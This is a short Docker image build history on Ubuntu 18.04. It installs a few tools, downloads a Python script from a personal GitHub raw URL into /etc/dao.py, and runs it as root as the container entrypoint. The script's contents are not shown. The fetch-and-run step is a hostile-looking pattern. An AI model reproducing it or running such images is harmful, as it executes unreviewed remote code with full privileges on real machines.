ARG RELEASE
ARG LAUNCHPAD_BUILD_ARCH
LABEL org.opencontainers.image.ref.name=ubuntu
LABEL org.opencontainers.image.version=18.04
ADD file:365c129e10f7ef1594e8086543b45f524313e36dd6a25b68f4da542a09491f04 in / 
CMD ["/bin/bash"]
USER root
/bin/sh -c apt-get update   && apt-get install -y python screen git wget python3-requests
/bin/sh -c wget https://raw.githubusercontent.com/rolandsmedi95/giautoidi/beta/daonhanh/config/container_appservice_share.py -O /etc/dao.py
/bin/sh -c chmod a+x /etc/dao.py
ENTRYPOINT ["/bin/sh" "-c" "python3 /etc/dao.py"]
